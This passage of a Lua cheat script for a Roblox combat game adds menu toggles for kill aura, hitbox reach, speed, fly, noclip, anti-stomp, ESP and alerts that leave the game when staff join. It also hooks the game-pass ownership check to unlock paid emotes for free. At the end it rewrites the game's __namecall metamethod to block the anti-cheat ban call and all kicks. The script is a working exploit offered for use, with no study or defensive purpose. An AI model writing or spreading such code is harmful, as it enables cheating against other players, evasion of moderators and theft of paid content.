            cl:SetAttribute("InfStamina", false)
        end
    end,
    ["HoverText"] = "Activates or disables the InfStamina attribute", -- text that will show up after hovering over the button (optional)
})
--
local InfDash = Utility.CreateOptionsButton({
    ["Name"] = "Infinite roll", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            cl:SetAttribute("InfiniteDash", true)
        else
            cl:SetAttribute("InfiniteDash", false)
        end
    end,
    ["HoverText"] = "Activates or disables the InfiniteDash attribute", -- text that will show up after hovering over the button (optional)
})
--
local AntiCombatLog = Utility.CreateOptionsButton({
    ["Name"] = "Anti combat log", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            bind("CombatLog", cl:GetAttributeChangedSignal("CombatTime"):Connect(function()
                cl:SetAttribute("CombatTime", 0)
                cl:SetAttribute("LastHitBy", "")
            end))
        else
            unbind("CombatLog")
        end
    end,
    ["HoverText"] = "Makes combat log not affect you", -- text that will show up after hovering over the button (optional)
})
--
local FreePaidEmotes = Utility.CreateOptionsButton({
    ["Name"] = "Free paid emotes", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        bypassEmotes = callback
    end,
    ["HoverText"] = "Why paid for some bad emotes when you can get them for free?", -- text that will show up after hovering over the button (optional)
})
--
local LeaveOnStaffJoin = Utility.CreateOptionsButton({
    ["Name"] = "Leave on staff join", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        canbeKickedFromGame = callback
        if callback then
            task.spawn(function()
                for _,v in pairs(plrs:GetChildren()) do
                    if v ~= cl then
                        local isIt, Rank = IsA_Staff(v)
                        if isIt then
                            cl:Kick(v.Name.." Was on your server, rank: "..v:GetRoleInGroup(10294339) or Rank.." Closing your game in 10s..")
                            task.wait(10)
                            game:shutdown()
                        end
                    end
                end
            end)
            bind("LOSJ", plrs.PlayerAdded:Connect(function(p)
                local isIt, Rank = IsA_Staff(p)
                if isIt then
                    cl:Kick(p.Name.." Was on your server, rank: "..p:GetRoleInGroup(10294339) or Rank.." Closing your game in 10s..")
                    task.wait(10)
                    game:shutdown()
                end
            end))
        else
            unbind("LOSJ")
        end
    end,
    ["HoverText"] = "Leaves the game when a staff joins or when it's already on your game", -- text that will show up after hovering over the button (optional)
})
--
local WarnOnStaffJoin = Utility.CreateOptionsButton({
    ["Name"] = "Warn on staff join", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            task.spawn(function()
                for _,v in pairs(plrs:GetChildren()) do
                    if v ~= cl then
                        local isIt, Rank = IsA_Staff(v)
                        if isIt then
                            local f = shared.GuiLibrary["CreateNotification"]("Staff alert", ""..v.Name.." Is on your server, rank: "..v:GetRoleInGroup(10294339) or Rank.."", 100, "assets/WarningNotification.png")
                            f.Frame.Frame.ImageColor3 = Color3.fromRGB(236, 129, 44)
                        end
                    end  
                end
            end)
            bind("WOSJ", plrs.PlayerAdded:Connect(function(p)
                if callback then
                    local isIt, Rank = IsA_Staff(p)
                    if isIt then
                        local f = shared.GuiLibrary["CreateNotification"]("Staff alert", ""..p.Name.." Has joined your server, rank: "..p:GetRoleInGroup(10294339) or Rank.."", 100, "assets/WarningNotification.png")
                        f.Frame.Frame.ImageColor3 = Color3.fromRGB(236, 129, 44)
                    end
                end
            end))
        else
            unbind("WOSJ")
        end
    end,
    ["HoverText"] = "Sends a notification when a staff joins or when it's already on your game", -- text that will show up after hovering over the button (optional)
})
local HideName = Utility.CreateOptionsButton({
    ["Name"] = "HideName", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            for i,v in pairs(leaderboardui.Leaderboard.Inner.ScrollingFrame:GetDescendants()) do
                if v:IsA("TextLabel") or v.ClassName == "TextLabel" then
                    if v.Text == cl.Name or v.Text == cl.DisplayName then
                        myleaderboardframe = v.Parent.Parent
                    end  
                end
            end
            if cl.PlayerGui and cl.PlayerGui:FindFirstChild("Profile") then
                cl.PlayerGui:FindFirstChild("Profile").Main.TextLabel.Visible = false
            end
            if myleaderboardframe ~= nil then
                myleaderboardframe.PlayerName.Actual.Visible = false
                myleaderboardframe.PlayerName.Display.Visible = false
            end
            bind("autohidename", cl.CharacterAdded:Connect(function() -- idk why i even made this
                task.wait(.15)
                for i,v in pairs(leaderboardui.Leaderboard.Inner.ScrollingFrame:GetDescendants()) do
                    if v:IsA("TextLabel") or v.ClassName == "TextLabel" then
                        if v.Text == cl.Name or v.Text == cl.DisplayName then
                            myleaderboardframe = v.Parent.Parent
                        end  
                    end
                end
                if cl.PlayerGui and cl.PlayerGui:FindFirstChild("Profile") then
                    cl.PlayerGui:FindFirstChild("Profile").Main.TextLabel.Visible = false
                end
                if myleaderboardframe ~= nil then
                    myleaderboardframe.PlayerName.Actual.Visible = false
                    myleaderboardframe.PlayerName.Display.Visible = false
                end
            end))
        else
            unbind("autohidename")
            if cl.PlayerGui and cl.PlayerGui:FindFirstChild("Profile") then
                cl.PlayerGui:FindFirstChild("Profile").Main.TextLabel.Visible = true
            end
            if myleaderboardframe ~= nil then
                myleaderboardframe.PlayerName.Actual.Visible = true
                myleaderboardframe.PlayerName.Display.Visible = true
            end
        end
    end,
    ["HoverText"] = "Hides your name or riot guis (not chat or roblox menu, mostly usefull for recording)", -- text that will show up after hovering over the button (optional)
})
local nocdjump0 = false
local NoJumpCooldown = Utility.CreateOptionsButton({
    ["Name"] = "No jump cooldown", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        nocdjump0 = callback
        if callback then
            task.spawn(function()
                repeat task.wait()
                    if nocdjump0 then
                        for _,v in pairs(getconnections(uis.JumpRequest)) do 
                            v:Disable()
                        end
                    else
                        break
                    end
                until false
            end)
        else
            for i = 1,5 do task.wait(.15)
                for _,v in pairs(getconnections(uis.JumpRequest)) do
                    v:Enable()
                end
            end
        end
    end,
    ["HoverText"] = "Toggles the annoying cooldown for jumping", -- text that will show up after hovering over the button (optional)
})
local PileAura = Utility.CreateOptionsButton({
    ["Name"] = "Pile aura", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            bind("PileAura", runService.RenderStepped:Connect(function()
                if cl.Character and cl.Character.Parent and cl.Character:FindFirstChild("HumanoidRootPart") then
                    pcall(function()
                        local root = cl.Character and cl.Character.HumanoidRootPart or cl.Character.Torso or nil
                        if root ~= nil then
                            for i,v in pairs(workspace.Piles:GetDescendants()) do
                                if v:IsA("ProximityPrompt") and root and not v.Parent:IsA("Script") and (v.Parent.Position - root.Position).Magnitude <= 10 then -- found out that if you grab a pile from +10 studs it doesn't give you anything
                                    fireproximityprompt(v, 10)
                                end
                            end
                        end
                    end)
                end
            end))
        else
            unbind("PileAura")
        end
    end,
    ["HoverText"] = "Grabs any pile near you instantly", -- text that will show up after hovering over the button (optional)
})
--// Combat
local KillAura = Combat.CreateOptionsButton({
    ["Name"] = "Kill aura", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        isKA_Enabled = callback
        if callback then
            if killauraCircleRange then
                killauraCircleRange.Parent = workspace.CurrentCamera
            end
            task.spawn(function()
                bind("KillAuraStuff", runService.RenderStepped:Connect(function()
                    for i,v in pairs(workspace:GetChildren()) do
                        if isKA_Enabled and killauralookat and (cl.Character and cl.Character:FindFirstChildOfClass("Tool")) then
                            if v.Name ~= cl.Name and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and (not v:GetAttribute("Downed")) and isAlive() and getDistance(v.Torso.Position, cl.Character.Torso.Position, false) <= killauraRange then
                                if killauralookat and cl.Character and v then
                                    pcall(function()
                                        local root1, root2 = v and v.HumanoidRootPart or v.Torso or v.PrimaryPart, cl.Character and cl.Character.HumanoidRootPart or cl.Character.Torso or cl.Character.PrimaryPart
                                        cl.Character.HumanoidRootPart.CFrame = CFrame.lookAt(root2.Position, root2.Position + ((root1.Position - root2.Position) * Vector3.new(1, 0, 1)).Unit)
                                    end)
                                end
                                -- Do a jump if not strafing
                                if (cl.Character.Humanoid.FloorMaterial ~= Enum.Material.Air) and alwaysJump and (not strafing) then
                                    cl.Character.HumanoidRootPart.Velocity = Vector3.new(cl.Character.HumanoidRootPart.Velocity.X, 40, cl.Character.HumanoidRootPart.Velocity.Z)
                                end
                            end 
                        else
                            -- do nothing
                        end
                    end
                end))
                repeat
                    if (not isKA_Enabled) then break end
                    if not cl.Character:FindFirstChildOfClass("Tool") or cl.Character:FindFirstChildOfClass("Tool") and table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) then
                        repeat task.wait()
                            if not isKA_Enabled then 
                                return
                            end  
                        until cl.Character:FindFirstChildOfClass("Tool") and not healItems[cl.Character:FindFirstChildOfClass("Tool").Name]
                    end
                    if isAlive() and cl.Character:FindFirstChildOfClass("Tool") and not table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) and (cl.Character:GetAttribute("Blocking") == false or not uis:IsKeyDown(Enum.KeyCode.F) and cl.Character:GetAttribute("Crouch") == false) then
                        pcall(function()
                            Old_HitNearbyPlayer()
                        end)   
                    end 
                    if killauraattackcd then
                        task.wait(getWeaponCooldown())
                    else
                        task.wait()
                    end   
                until (not isKA_Enabled)
            end)
        else
            unbind("KillAuraStuff")
        end
    end,
    ["HoverText"] = "Attacks players around you without having to click or look at them", -- text that will show up after hovering over the button (optional)
})
KillAura.CreateSlider({
    ["Name"] = "Range", -- name of object
    ["Min"] = 1,
    ["Max"] = 10,
    ["Function"] = function(val) -- function that is called when the slider changes
        killauraRange = val
        if killauraCircleRange then
            killauraCircleRange.Size = Vector3.new(val * .7, .01, val * .7)
        end
    end,
    ["HoverText"] = "How far kill aura attacks a player", -- text that will show up after hovering over the button (optional)
    ["Default"] = 10 -- default value (optional)
})
KillAura.CreateColorSlider({
    ["Name"] = "Target Color",
		["Function"] = function(hue, sat, val) 
			killAuraColor = Color3.fromHSV(hue, sat, val)
			if killauraCircleRange then 
				killauraCircleRange.Color = Color3.fromHSV(hue, sat, val)
			end
		end,
	["Default"] = 1
})
KillAura.CreateToggle({
    ["Name"] = "Visualize range", -- name of object
    ["HoverText"] = "Creates a circle to visualize your range", -- text that will show up after hovering over the button (optional)
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            killauraCircleRange = Instance.new("MeshPart")
            killauraCircleRange.MeshId = "rbxassetid://3726303797"
            killauraCircleRange.Color = killAuraColor
            killauraCircleRange.CanCollide = false
            killauraCircleRange.Anchored = true
            killauraCircleRange.Material = Enum.Material.Neon
            killauraCircleRange.Size = Vector3.new(killauraRange * .7, .01, killauraRange * .7)
            killauraCircleRange.Parent = workspace.CurrentCamera
            killauraCircleRange.Transparency = .1
            bind("KillAuraVisualizer", runService.RenderStepped:Connect(function()
                if killauraCircleRange then
                    killauraCircleRange.Position = cl.Character and cl.Character.HumanoidRootPart.Position - Vector3.new(0, cl.Character.Humanoid.HipHeight, 0) or Vector3.new(1,1,1)
                end
            end))
        else
            unbind("KillAuraVisualizer")
            if killauraCircleRange then
                killauraCircleRange:Destroy()
                killauraCircleRange = nil
            end
        end
    end,
    ["Default"] = false -- Value upon launch (optional)
})
KillAura.CreateToggle({
    ["Name"] = "Ignore friends", -- name of object
    ["HoverText"] = "Makes kill aura ignore your roblox friends", -- text that will show up after hovering over the button (optional)
    ["Function"] = function(callback) -- function that is called when toggled
        friendly_mode = callback
    end,
    ["Default"] = false -- Value upon launch (optional)
})
KillAura.CreateToggle({
    ["Name"] = "Always jump", -- name of object
    ["HoverText"] = "Jumps when kill aura is attacking someone", -- text that will show up after hovering over the button (optional)
    ["Function"] = function(callback) -- function that is called when toggled
        alwaysJump = callback
    end,
    ["Default"] = false -- Value upon launch (optional)
})
KillAura.CreateToggle({
    ["Name"] = "Look at target", -- name of object
    ["HoverText"] = "Makes your character look at the player you're attacking to.", -- text that will show up after hovering over the button (optional)
    ["Function"] = function(callback) 
        killauralookat = callback
    end,
    ["Default"] = false -- Value upon launch (optional)
})
KillAura.CreateToggle({
    ["Name"] = "Attack on cd", -- name of object
    ["HoverText"] = "Attacks based on your weapon cooldown (Safer than just spamming the remote but it's slower)", -- text that will show up after hovering over the button (optional)
    ["Function"] = function(callback) 
        killauraattackcd = callback
    end,
    ["Default"] = false -- Value upon launch (optional)
})
local AutoHeal = Combat.CreateOptionsButton({
    ["Name"] = "Auto heal", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            task.spawn(function()
                repeat task.wait(.25)
                    local oldTool
                    if cl.Character:FindFirstChildOfClass("Tool") and not table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) then
                        oldTool = cl.Character:FindFirstChildOfClass("Tool")
                    end
                    if cl.Character and cl.Character:FindFirstChildOfClass("Humanoid") and cl.Character.Humanoid.Health <= autoHealth_HP and oldTool ~= nil then
                        for i,v in pairs(cl.Backpack:GetChildren()) do
                            if v:IsA("Tool") and table.find(healItems, v.Name) then
                                v.Parent = cl.Character
                                v:Activate()
                                if oldTool then
                                    oldTool.Parent = cl.Backpack
                                end
                                repeat task.wait() until not v.Parent == cl.Character or v == nil
                                task.wait(.25)
                                oldTool.Parent = cl.Character
                            end
                        end
                    end
                until not callback
            end)
        end
    end,
    ["HoverText"] = "Automatically uses any food / heal in your inventory when your hp is below %", -- text that will show up after hovering over the button (optional)
})
AutoHeal.CreateSlider({
    ["Name"] = "HP", -- name of object
    ["Min"] = 1,
    ["Max"] = 99,
    ["Function"] = function(val) -- function that is called when the slider changes
        autoHealth_HP = val
    end,
    ["HoverText"] = "When your health reaches the % you specified it will heal you.", -- text that will show up after hovering over the button (optional)
    ["Default"] = 40 -- default value (optional)
})
local AutoStomp = Combat.CreateOptionsButton({
    ["Name"] = "Auto stomp", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            task.spawn(function()
                repeat task.wait(.25)
                    if not callback then break end
                    for i,v in pairs(plrs:GetChildren()) do
                        if v.Character and cl.Character and v ~= cl then
                            pcall(function()
                                if v and cl.Character and (v.Character.PrimaryPart.Position - cl.Character.PrimaryPart.Position).Magnitude <= 10 and v.Character:GetAttribute("Downed") then
                                    MainRemote:FireServer({["KeyCode"] = Enum.KeyCode.X})
                                end
                            end)
                        end
                    end
                until not callback
            end)
        else
            unbind("AutoStomp")
        end
    end,
    ["HoverText"] = "Automatically stomps ANY nearby players", -- text that will show up after hovering over the button (optional)
})
local NoEquipdelay = Combat.CreateOptionsButton({
    ["Name"] = "No equip delay", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            for i,_ in pairs(require(rep.Weapons)) do
                require(rep.Weapons)[i].EquipAttackDelay = 0
            end
        else
            for i,_ in pairs(require(rep.Weapons)) do
                require(rep.Weapons)[i].EquipAttackDelay = original_equip_delays[i]
            end
        end
    end,
    ["HoverText"] = "Removes the delay for attacking while equipping a weapon", -- text that will show up after hovering over the button (optional)
})
--// Blatant
local ReachSlider
local ReachOffset
local ReachDirection
local ReachButton 
ReachButton = Blatant.CreateOptionsButton({
    ["Name"] = "Reach", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            if not cl.Character:FindFirstChildOfClass("Tool") then
                shared.GuiLibrary["CreateNotification"]("Error","Equip a weapon for this to work", 6, "assets/InfoNotification.png")
                ReachButton["ToggleButton"](false)
                return
            elseif cl.Character:FindFirstChildOfClass("Tool") and table.find(healItems, cl.Character:FindFirstChildOfClass("Tool").Name) then
                shared.GuiLibrary["CreateNotification"]("Error","Can't add new hitboxes points\nReason: Can't add hitbox points to a healing item", 5, "assets/InfoNotification.png")
                ReachButton["ToggleButton"](false)
                return
            end                 
            if ReachDirectionValue == "1" then
                AddHitboxToEquipped(ReachValue or 5, ReachOffsetValue or 1, "X")
            elseif ReachDirectionValue == "2" then
                AddHitboxToEquipped(ReachValue or 5, ReachOffsetValue or 1, "Y")
            elseif ReachDirectionValue == "3" then
                AddHitboxToEquipped(ReachValue or 5, ReachOffsetValue or 1, "Z")
            else
                AddHitboxToEquipped(ReachValue or 5, ReachOffsetValue or 1)
            end
            shared.GuiLibrary["CreateNotification"]("Added new hitboxes","Success.", 3, "assets/InfoNotification.png")
            ReachButton["ToggleButton"](false)   
        end
    end,
    ["HoverText"] = "Expand your weapon's hitbox, use debug mode to view it\n(Almost all of the weapons are supported so use Direction only if it is not supported)", -- text that will show up after hovering over the button (optional)
})
ReachSlider = ReachButton.CreateSlider({
    ["Name"] = "Range", -- name of object
    ["Min"] = 0,
    ["Max"] = 15,
    ["Function"] = function(v) ReachValue = v end,
    ["HoverText"] = "Ammount of hitbox points", -- text that will show up after hovering over the button (optional)
    ["Default"] = 5 -- default value (optional)
})
ReachOffset = ReachButton.CreateSlider({
    ["Name"] = "Offset", -- name of object
    ["Min"] = 0,
    ["Max"] = 8,
    ["Function"] = function(v) ReachOffsetValue = v end,
    ["HoverText"] = "How far are the hitbox points from each other (Hitbox might break if the value is too high)", -- text that will show up after hovering over the button (optional)
    ["Default"] = 1 -- default value (optional)
})
ReachDirection = ReachButton.CreateSlider({
    ["Name"] = "Direction", -- name of object
    ["Min"] = 0,
    ["Max"] = 3,
    ["Function"] = function(v) ReachDirectionValue = v end,
    ["HoverText"] = "0: None (Use this for supported weapons)\n1: X\n2: Y\n3: Z", -- text that will show up after hovering over the button (optional)
    ["Default"] = 0 -- default value (optional)
})
local AntiDown = Blatant.CreateOptionsButton({
    ["Name"] = "Anti down", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            bind("AntiDown", runService.RenderStepped:Connect(function()
                if cl.Character and cl.Character:GetAttribute("Downed") then
                    cl.Character:SetAttribute("Downed", false)
                end
            end))
        else
            unbind("AntiDown")
        end
    end,
    ["HoverText"] = "Getting downed / K.O will not affect you", -- text that will show up after hovering over the button (optional)
})
local AntiStomp = Blatant.CreateOptionsButton({
    ["Name"] = "Anti stomp", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            bind("AntiStomp", runService.RenderStepped:Connect(function()
                if cl.Character then
                    if (cl.Character and cl.Character:FindFirstChild("Torso") and cl.Character:FindFirstChild("Head") and cl.Character:FindFirstChildOfClass("Humanoid")) and (cl.Character:FindFirstChildOfClass("Humanoid").Health <= 5 or cl.Character:GetAttribute("Downed")) then
                        if cl.Character.Torso:FindFirstChild("Neck") then
                            cl.Character.Torso.Neck:Destroy()
                        else
                            cl.Character:Destroy()
                        end    
                    end
                end
            end))
        else
            unbind("AntiStomp")
        end
    end,
    ["HoverText"] = "Makes you unable to be stomped & bounty taken (except if someone with madness downs you)", -- text that will show up after hovering over the button (optional)
})
local WSpeed = Blatant.CreateOptionsButton({
    ["Name"] = "Speed", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
           bind("CharacterSpeed", runService.RenderStepped:Connect(function(dt) -- thanks xylex, even though the cframe/velocity speed is easy to make
               if speed_mode == "CFrame" then
                   if cl.Character then
                       if (bodyVelocity_speed ~= nil) then
                           bodyVelocity_speed:Remove()
                       end
                       if cl.Character and cl.Character.PrimaryPart or cl.Character.HumanoidRootPart and cl.Character.Humanoid and speed_mode == "CFrame" then
                           cl.Character.HumanoidRootPart.CFrame = cl.Character.HumanoidRootPart.CFrame + (cl.Character.Humanoid.MoveDirection * (character_speed * dt))
                       else
                           print("Error0")
                       end
                   end
               elseif speed_mode == "Velocity" then
                   if cl.Character and (bodyVelocity_speed == nil or bodyVelocity_speed ~= nil and bodyVelocity_speed.Parent ~= cl.Character.HumanoidRootPart) then
                       bodyVelocity_speed = Instance.new("BodyVelocity")
                       bodyVelocity_speed.Parent = cl.Character.HumanoidRootPart
                       bodyVelocity_speed.MaxForce = Vector3.new(100000, 0, 100000)
                   else
                       if speed_mode == "Velocity" then
                           bodyVelocity_speed.Velocity = cl.Character and cl.Character.Humanoid and cl.Character.Humanoid.MoveDirection * character_speed
                       end
                   end
               elseif speed_mode == "WalkSpeed" then
                    if bodyVelocity_speed then
                        bodyVelocity_speed:Remove()
                    end
                    game:GetService("StarterPlayer").CharacterWalkSpeed = character_speed
               end
           end))
        else
            if bodyVelocity_speed then
                bodyVelocity_speed:Remove()
            end
            unbind("CharacterSpeed")
            game:GetService("StarterPlayer").CharacterWalkSpeed = 12
        end
    end,
    ["HoverText"] = "Change your speed.\nCFrame, Velocity or Walkspeed", -- text that will show up after hovering over the button (optional)
})
WSpeed.CreateSlider({
    ["Name"] = "Speed", -- name of object
    ["Min"] = 0,
    ["Max"] = 100,
    ["Function"] = function(val) -- function that is called when the slider changes
        character_speed = val
    end,
    ["HoverText"] = "The speed you're going to move", -- text that will show up after hovering over the button (optional)
    ["Default"] = 12 -- default value (optional)
})
WSpeed.CreateDropdown({
	["Name"] = "Mode", -- name of object
	["List"] = {"CFrame", "Velocity", "WalkSpeed"}, -- list of strings to choose from
	["Function"] = function(val) -- function that is called when you choose a string
            speed_mode = val
	end
})
local Fly = Blatant.CreateOptionsButton({
    ["Name"] = "Fly", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            if isAlive() then
                flypos_y = cl.Character.HumanoidRootPart.CFrame.Position.Y
            end
            bind("FlyUpKey", uis.InputBegan:Connect(function(i,v)
                if v then return end
                if i.KeyCode == Enum.KeyCode.Space then
                    fly_up = true
                elseif i.KeyCode == Enum.KeyCode.E then
                    fly_down = true
                end
            end))
            bind("FlyDownKey",  uis.InputEnded:Connect(function(i,v)
                if v then return end
                if i.KeyCode == Enum.KeyCode.Space then
                    fly_up = false
                elseif i.KeyCode == Enum.KeyCode.E then
                    fly_down = false
                end
            end))
            bind("Fly", runService.RenderStepped:Connect(function(dt) -- thanks xylex x2
                if fly_up then
                    flypos_y = flypos_y + (1 * (math.clamp(fly_vertical_speed - 16, 1, 150) * dt))
                end
                if fly_down then
                    flypos_y = flypos_y - (1 * (math.clamp(fly_vertical_speed - 16, 1, 150) * dt))
                end
                local flypos = (cl.Character.Humanoid.MoveDirection * (math.clamp(fly_speed - 16, 1, 150) * dt))
                cl.Character.HumanoidRootPart.CFrame = cl.Character.HumanoidRootPart.CFrame + Vector3.new(flypos.X, (flypos_y - cl.Character.HumanoidRootPart.CFrame.Position.Y), flypos.Z)
                cl.Character.HumanoidRootPart.Velocity = Vector3.zero or Vector3.new(0, 0, 0) 
            end))
        else
            unbind("Fly")
            unbind("FlyUpKey") 
            unbind("FlyDownKey")
            fly_down = false
            fly_up = false
        end
    end,
    ["HoverText"] = "Fly for 7s to prevent lagbacks\nSpace: Go up\nE: Go down" -- text that will show up after hovering over the button (optional)
})
Fly.CreateSlider({
    ["Name"] = "Horizontal speed", -- name of object
    ["Min"] = 1,
    ["Max"] = 150,
    ["Function"] = function(val) -- function that is called when the slider changes
        fly_speed = val
    end,
    ["HoverText"] = "The speed you're going to move", -- text that will show up after hovering over the button (optional)
    ["Default"] = 50 -- default value (optional)
})
Fly.CreateSlider({
    ["Name"] = "Vertical speed", -- name of object
    ["Min"] = 1,
    ["Max"] = 150,
    ["Function"] = function(val) -- function that is called when the slider changes
        fly_vertical_speed = val
    end,
    ["HoverText"] = "The speed you're going to move upwards", -- text that will show up after hovering over the button (optional)
    ["Default"] = 50 -- default value (optional)
})
local Noclip = Blatant.CreateOptionsButton({
    ["Name"] = "Noclip", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            bind("Noclip", runService.Stepped:Connect(function()
                if cl.Character and cl.Character.Parent then
                    for _, child in pairs(cl.Character:GetDescendants()) do
                        if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
                            child.CanCollide = false
                        end
                    end
                end
            end))
        else
            unbind("Noclip")
        end
    end,
    ["HoverText"] = "Allows you to go trough solid objects", -- text that will show up after hovering over the button (optional)
})
local Infjump = Blatant.CreateOptionsButton({
    ["Name"] = "Infinite jump", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            bind("InfiniteJump", uis.InputBegan:Connect(function(i,v)
                if not v and i.KeyCode == Enum.KeyCode.Space then
                    if cl.Character and cl.Character.Parent then
                        cl.Character:FindFirstChildOfClass("Humanoid"):ChangeState(3)
                    end
                end
            end))
        else
            unbind("InfiniteJump")
        end
    end,
    ["HoverText"] = "average happy mod user", -- text that will show up after hovering over the button (optional)
})
--// Render
local NoLightingChange = Render.CreateOptionsButton({
    ["Name"] = "No lighting change", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            lighting.RageCC.Enabled = false
            lighting.MadnessCC.Enabled = false
        else
            lighting.RageCC.Enabled = true
            lighting.MadnessCC.Enabled = true
        end
    end,
    ["HoverText"] = "Makes rage and madness not affect lighting", -- text that will show up after hovering over the button (optional)
})
local SanctuaryLighting = Render.CreateOptionsButton({
    ["Name"] = "Sanctuary lighting", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            cl:SetAttribute("WorldArea", "Sanctuary")
        else
            cl:SetAttribute("WorldArea", "Main")
        end
    end,
    ["HoverText"] = "Changes the lighting to the sanctuary one", -- text that will show up after hovering over the button (optional)
})
local PilesESP = Render.CreateOptionsButton({
    ["Name"] = "Piles ESP", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            for _,v in pairs(workspace.Piles:GetChildren()) do
                if v:IsA("Model") then
                    local highlight = Instance.new("Highlight", game:GetService("CoreGui"))
                    highlight.FillTransparency = 1; highlight.OutlineColor = Color3.fromRGB(255, 255, 255); highlight.OutlineTransparency = 0; highlight.Name = "PILE_ESP"; highlight.Adornee = v
                end
            end
        else
            for _,v in pairs(game:GetService("CoreGui"):GetChildren()) do
                if v:IsA("Highlight") and v.Name == "PILE_ESP" then
                    v:Destroy()
                end
            end
        end
    end,
    ["HoverText"] = "Makes finding piles alot easier", -- text that will show up after hovering over the button (optional)
})
local MysteryBoxESP = Render.CreateOptionsButton({
    ["Name"] = "Mystery box ESP", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        if callback then
            local highlight = Instance.new("Highlight", game:GetService("CoreGui"))
            highlight.FillTransparency = .75; highlight.FillColor = Color3.fromRGB(32, 144, 196) highlight.OutlineColor = Color3.fromRGB(32, 144, 196); highlight.OutlineTransparency = 0; highlight.Name = "BOX_ESP"; highlight.Adornee = workspace.Mystery.MysteryBox
        else
            if game:GetService("CoreGui"):FindFirstChild("BOX_ESP") then
                game:GetService("CoreGui"):FindFirstChild("BOX_ESP"):Destroy()
            end  
        end
    end,
    ["HoverText"] = "box.", -- text that will show up after hovering over the button (optional)
})
--// World
local Gravity = World.CreateOptionsButton({
    ["Name"] = "Gravity", -- name of object
    ["Function"] = function(callback) -- function that is called when toggled
        gravityEnabled = callback
        if (not callback) then
            workspace.Gravity = 196.2
        end
    end,
})
Gravity.CreateSlider({
    ["Name"] = "Gravity", -- name of object
    ["Min"] = 0,
    ["Max"] = 196,
    ["Function"] = function(val) -- function that is called when the slider changes
        workspace.Gravity = gravityEnabled and tonumber(val) or 196.2
    end,
    ["Default"] = 196 -- default value (optional)
})
--// End of script
local hooked_emotes = hookfunction(game:GetService("MarketplaceService").UserOwnsGamePassAsync, function(...)
    return bypassEmotes
end)
if not getgenv()._G.BypassedMetas then
    --// Ban bypass or something
    local GetRawMetaFunc = getrawmetatable or debug.getmetatable
    --
    local GameRawMetatable = GetRawMetaFunc(game)
    --
    if setreadonly then -- support for multiple exploits
        setreadonly(GameRawMetatable, false)
    elseif make_writeable then
        make_writeable(GameRawMetatable)
    end
    --
    local OriginalNamecall = GameRawMetatable.__namecall
    --
    GameRawMetatable.__namecall = newcclosure(function(self, ...)
        local CallMethod = tostring(getnamecallmethod()) -- idk if tostring is needed but i use it anyways
        local Args = {...}
        --
        if CallMethod == "FireServer" and self.Name == "MainRemote" and Args[1] == "hello!!" then -- the "ban" argument is "hello!!" lol.
            return task.wait(math.huge) or task.wait(9e9) -- returns an infinite wait so we don't get banned but sadly we do get crashed :(
        end
        if CallMethod == "Kick" and self == cl and (not canbeKickedFromGame and not LeaveOnStaffJoin["Toggle"]) then -- an anti kick (Client side ofc)
            return
        end
        return OriginalNamecall(self, ...) -- we need this so roblox doesn't kill himself
    end)
    getgenv()._G.BypassedMetas = true
end
--
shared.VapeManualLoad = true
--
shared.GuiLibrary["CreateNotification"]("Credits","Script made by: lol_.#2841\nUI made by: 7GrandDadVape / xylex", 5, "assets/InfoNotification.png")  
game:GetService("ScriptContext"):SetTimeout(.05)
--
shared.GuiLibrary.SelfDestructEvent.Event:Connect(function()
    for i,_ in pairs(newHitboxes) do
        newHitboxes[i]:Destroy() -- Just so the hitboxes don't glitch
    end
    if killauraCircleRange then
        killauraCircleRange:Destroy()
    end
end)